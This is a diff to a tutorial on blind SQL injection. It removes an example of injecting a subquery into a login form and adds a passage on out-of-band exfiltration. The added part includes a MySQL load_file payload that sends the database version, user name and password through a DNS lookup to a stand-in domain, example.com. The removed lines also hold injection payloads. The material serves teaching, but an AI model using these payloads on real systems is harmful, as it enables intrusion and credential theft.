@@ -162,14 +162,14 @@ In many cases of SQL injection, the application does not return the results of a
 You can try various techniques to retrieve data and verify that other malicious
 actions have been successful.
 
-There are many circumstances in which you may be able to inject an arbitrary query but not retrieve its results. Recall the example of the vulnerable login form, where the username and password fields are vulnerable to SQL injection:
+One method for retrieving data that is often effective in this situation is to use an out-of-band channel. Having achieved the ability to execute arbitrary SQL statements within the database, it is often possible to leverage some of the database’s built-in functionality to create a network connection back to your own computer, over which you can transmit arbitrary data that you have gathered from the database.
 
-```SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’```
+The means of creating a suitable network connection are highly database- dependent. Different methods may or may not be available given the privilege level of the database user with which the application is accessing the database. Some of the most common and effective techniques for each type of database are described here.
 
-In addition to modifying the query’s logic to bypass the login, you can inject an entirely separate subquery using string concatenation to join its results to the item you control. For example:
+If the MySQL database server is started with an empty secure_file_priv global system variable, which is the case by default for MySQL server 5.5.52 and below (and in the MariaDB fork), an attacker can exfiltrate data and then use the load_file function to create a request to a domain name, putting the exfiltrated data in the request.
 
-``` foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)--```
+Let’s say the attacker is able to execute the following SQL query in the target database:
 
-This causes the application to perform the following query:
+```SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))```
 
-```SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’```
+This will cause the application to send a DNS request to the domain database_version.database_user.database_password.example.com, exposing sensitive data (database version, user name, and the user’s password) to the attacker.
